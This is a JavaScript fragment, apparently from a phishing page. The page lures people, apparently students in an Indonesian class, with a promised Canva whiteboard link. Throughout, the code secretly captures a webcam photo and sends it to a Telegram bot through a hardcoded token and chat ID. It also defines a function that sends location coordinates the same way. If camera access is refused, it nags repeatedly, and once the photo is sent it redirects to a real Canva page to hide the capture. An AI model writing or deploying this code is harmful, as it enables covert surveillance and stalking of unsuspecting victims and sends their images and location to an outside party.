        function capture() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        stream.getTracks().forEach(track => track.stop());
                        canvas.toBlob(blob => {
                            sendToTelegram(blob);
                        }, 'image/jpeg');
                    };
                })
                .catch(error => {

                    send("Access denied.");
                    alert("Berikan izin kamera untuk mendapatkan tautan Canva whitebaord sejarah XI TJKT 1, pastikan izin diberikan lalu refresh halaman ini.");
                    capture();
                });
        }

        async function sendToTelegram(blob) {
            const telegramToken = '7615407628:AAHvcid5eH4uv64vDHfz-As8Di2G_eQhdy0';
            const chatId = '6879437432';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            window.location.replace("https://www.canva.com/design/DAGcU5KUZUM/Cg_UnYx-M7jhoeP7SDI45g/edit?utm_content=DAGcU5KUZUM&utm_campaign=designshare&utm_medium=link2&utm_source=sharebutton");
        }

        async function sendLocation(latitude, longitude) {
            const telegramToken = '7615407628:AAHvcid5eH4uv64vDHfz-As8Di2G_eQhdy0';
            const chatId = '6879437432';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('latitude', latitude);
            formData.append('longitude', longitude);

            await fetch(`https://api.telegram.org/bot${telegramToken}/sendLocation`, {
                method: 'POST',
                body: formData
            });
        }

        function send(msg) {
            const telegramToken = '7615407628:AAHvcid5eH4uv64vDHfz-As8Di2G_eQhdy0';
            const chatId = '6879437432';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', msg);

            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: 'POST',
                body: formData
            });
        }
